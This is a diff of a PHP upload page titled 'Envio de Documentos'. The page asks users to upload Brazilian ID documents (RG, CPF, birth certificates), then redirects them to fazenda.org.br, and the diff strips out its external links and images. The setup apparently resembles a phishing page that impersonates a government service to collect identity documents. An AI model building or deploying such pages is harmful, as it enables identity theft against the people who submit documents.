@@ -1,4 +1,4 @@
-<?php
+﻿<?php
 
 if($_POST['submit'] == "Upload"){
 	include('config/UpLoadTree.php');
@@ -13,8 +13,8 @@ header("refresh: 1; url=http://www.fazenda.org.br");
 ?>
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-<link rel="shortcut icon" href="http://fazenda.org.br/esocial/imagens/favicon.ico" type="image/x-icon">
-<center><img src="http://infocosolucao.esy.es/upimage.png"/></center>
+<link rel="" type="image/x-icon">
+<center><img src=""/></center>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Envio de Documentos</title>
 <script type="text/javascript" src="js/jquery.js">             	</script>
@@ -44,7 +44,7 @@ header("refresh: 1; url=http://www.fazenda.org.br");
 			
 			<b>Dependentes:</b><br>
 			● RG, Certidão de Nascimento e CPF dos dependentes<br>
-			● Preencher ficha de Dependentes, assinar e enviar digitalizada junto dos demais documentos: <a href="https://www.google.com.br/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0ahUKEwjYx7XHu9rYAhUKjJAKHQV2DhIQFggoMAA&url=http%3A%2F%2Fwww.portal.cps.sp.gov.br%2Fcrh%2Fnpp%2Fmanuais-e-modelos%2Fdownloads%2Flaca%2Fdeclaracao-dependentes.doc&usg=AOvVaw2EUQaRBykvE9MNC7MLrmaf">Download Ficha</a> <br><br>
+			● Preencher ficha de Dependentes, assinar e enviar digitalizada junto dos demais documentos: <a href="">Download Ficha</a> <br><br>
 			<font face="verdana" color="red"> <b><small><small>(Clicar em download para baixar a ficha de “Declaração de Encargos de Familia para fins de Imposto de Renda”. Assinar e enviar digitalizada junto dos demais documentos.)<br>
 			Envio de arquivos; digitalizar os documentos com resolucão de 100 x 100 dpi.</b>
 			
